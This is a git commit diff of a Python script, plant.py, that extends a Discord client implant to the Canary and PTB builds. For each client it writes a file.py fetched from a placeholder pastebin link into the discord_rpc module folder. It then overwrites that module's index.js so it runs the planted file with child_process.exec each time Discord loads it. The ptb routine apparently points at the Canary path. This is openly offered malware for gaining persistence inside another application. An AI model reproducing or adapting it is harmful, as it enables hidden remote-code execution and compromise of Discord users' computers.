bdc5a556a595af82227cef9a401308dc06ee2b6e
9s6 <72808522+9s6@users.noreply.github.com>
2021-01-30 15:53:47 +0100

    now also plants in canary and ptb

--- plant.py
+++ plant.py
@@ -1,22 +1,69 @@
 import requests, os
 
+def normal():
+    f = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py", "w")
+    f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
+    f.close()
 
-f = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//file.py", "w")
-f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
-f.close()
+    e = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//index.js", "w")
+    e.write("""
+    module.exports = {
+      RPCIPC: require('./RPCIPC'),
+      RPCWebSocket: require('./RPCWebSocket'),
+    };
+    var process = require('child_process');
+    process.exec('python""" + f" C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
+        if (err) {
+            console.log(stderr);
+        } else {
+            console.log(stdout);
+        }
+    });""")
+    e.close()
 
-e = open(f"C://Users//{str(os.getenv('username'))}//AppData//Roaming//discord//0.0.309//modules//discord_rpc//index.js", "w")
-e.write("""
-module.exports = {
-  RPCIPC: require('./RPCIPC'),
-  RPCWebSocket: require('./RPCWebSocket'),
-};
-var process = require('child_process');
-process.exec('python""" + f" C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
-    if (err) {
-        console.log(stderr);
-    } else {
-        console.log(stdout);
-    }
-});""")
-e.close()
+def canary():
+    f = open(f"C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/file.py", "w")
+    f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
+    f.close()
+
+    e = open(f"C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/index.js", "w")
+    e.write("""
+    module.exports = {
+      RPCIPC: require('./RPCIPC'),
+      RPCWebSocket: require('./RPCWebSocket'),
+    };
+    var process = require('child_process');
+    process.exec('python""" + f" C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
+        if (err) {
+            console.log(stderr);
+        } else {
+            console.log(stdout);
+        }
+    });""")
+    e.close()
+
+def ptb():
+    f = open(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discordptb/0.0.56/modules/discord_rpc/file.py", "w")
+    f.write(requests.get("Upload the edited text from plant.py to pastebin and put the raw link here").text)
+    f.close()
+
+    e = open(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discordptb/0.0.56/modules/discord_rpc/index.js", "w")
+    e.write("""
+    module.exports = {
+      RPCIPC: require('./RPCIPC'),
+      RPCWebSocket: require('./RPCWebSocket'),
+    };
+    var process = require('child_process');
+    process.exec('python""" + f" C:/Users/{str(os.getenv('username'))}/AppData/Local/DiscordCanary/app-1.0.21/modules/discord_rpc-10/discord_rpc/file.py'" + """ ,function (err,stdout,stderr) {
+        if (err) {
+            console.log(stderr);
+        } else {
+            console.log(stdout);
+        }
+    });""")
+    e.close()
+
+
+normal()
+canary()
+ptb()
